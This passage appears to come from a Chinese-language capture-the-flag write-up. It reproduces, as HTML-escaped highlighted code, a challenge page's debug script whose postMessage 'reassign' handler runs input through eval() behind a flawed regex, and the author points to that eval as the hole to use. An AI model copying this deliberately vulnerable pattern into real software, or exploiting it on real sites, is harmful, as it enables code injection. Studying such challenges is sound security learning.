class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x &lt;span class=&quot;token keyword&quot;&gt;of&lt;/span&gt; access&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;username &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; username &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; x&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;password &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;                            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; _onmessage &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onmessage&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token function-variable function&quot;&gt;onmessage&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; m &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;checkCredentials&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// do nothing if unauthorized&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;            &lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;ping&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// check the connection&lt;/span&gt;&lt;br&gt;                        e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;source&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;pong&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;logv&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// display variable&#39;s value by its name&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[logv]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; safe&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;info&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;                        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;compare&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// compare variable&#39;s value to a given one&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[compare]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;window&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;variable&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; safe&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;info&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;                        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;reassign&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// change variable&#39;s value&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; o &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; RegExp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;^[s-zA-Z-+0-9]+$&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;RegExp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;RegExp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                                &lt;span class=&quot;token keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;Invalid input given!&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                            &lt;span class=&quot;token function&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                            &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[reassign]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Value of &quot;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; was changed to &quot;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;warn&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                            &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[reassign]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Error changing value (&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;err&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                        &lt;span class=&quot;token function&quot;&gt;_onmessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// keep default functions&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token comment&quot;&gt;// hide this script on production&lt;/span&gt;&lt;br&gt;            document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;currentScript&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;./analytics/main.js?t=1627610836&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這個頁面的程式碼比其他兩頁多很多，而且可以找到一些我們需要的東西，比如說 &lt;code&gt;eval&lt;/code&gt;：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; _onmessage &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onmessage&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function-variable function&quot;&gt;onmessage&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; m &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;checkCredentials&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// do nothing if unauthorized&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;// ...&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;reassign&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// change variable&#39;s value&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; o &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; RegExp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;^[s-zA-Z-+0-9]+$&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;RegExp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;RegExp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;Invalid input given!&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                